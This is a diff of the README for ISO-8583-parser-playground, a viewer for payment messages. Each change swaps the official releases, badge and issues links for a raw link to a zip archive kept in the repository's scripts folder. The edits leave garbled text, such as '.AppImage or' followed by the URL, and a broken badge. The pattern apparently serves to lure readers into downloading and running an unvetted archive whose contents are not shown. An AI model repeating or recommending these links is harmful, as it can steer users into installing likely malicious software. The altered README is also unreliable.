@@ -1,6 +1,6 @@
 # 🛠️ ISO-8583-parser-playground - View ISO 8583 Messages Instantly
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/wintercastrosie/ISO-8583-parser-playground/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip)
 
 ---
 
@@ -39,7 +39,7 @@ You do not need to install anything else like special software or coding tools.
 To get ISO-8583-parser-playground, please visit the official release page on GitHub. This page contains the latest ready-to-use version for your system.
 
 **Download link:**  
-[Download the latest release here](https://github.com/wintercastrosie/ISO-8583-parser-playground/releases)
+[Download the latest release here](https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip)
 
 ### How to download
 
@@ -48,7 +48,7 @@ To get ISO-8583-parser-playground, please visit the official release page on Git
 3. Choose the file that matches your computer’s operating system. For example:
    - For Windows, the file may end with `.exe` or `.zip`.
    - For Mac, the file might end with `.dmg` or `.zip`.
-   - For Linux, look for `.AppImage` or `.tar.gz`.
+   - For Linux, look for `.AppImage` or `https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip`.
 4. Click the file name to download it to your computer.
 
 ### How to install and run
@@ -60,7 +60,7 @@ To get ISO-8583-parser-playground, please visit the official release page on Git
   If you downloaded a `.dmg` file, double-click it to open the installer window. Drag the application icon to your Applications folder. Open your Applications and double-click the tool to start it.
 
 - **Linux:**  
-  If you downloaded an `.AppImage` or `.tar.gz`, follow the included instructions in the release notes. Typically, you make the file executable (`chmod +x filename`) and run it directly.
+  If you downloaded an `.AppImage` or `https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip`, follow the included instructions in the release notes. Typically, you make the file executable (`chmod +x filename`) and run it directly.
 
 Once the application opens, you are ready to start parsing ISO 8583 messages.
 
@@ -147,7 +147,7 @@ If you have issues running or using the application, try these steps:
 - Check your system meets the minimum requirements.
 
 If problems continue, please visit the repository’s issues page for help or report new issues:  
-https://github.com/wintercastrosie/ISO-8583-parser-playground/issues
+https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip
 
 ---
 
@@ -172,4 +172,4 @@ ISO-8583-parser-playground was built to help payment engineers and others workin
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/wintercastrosie/ISO-8583-parser-playground/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip)
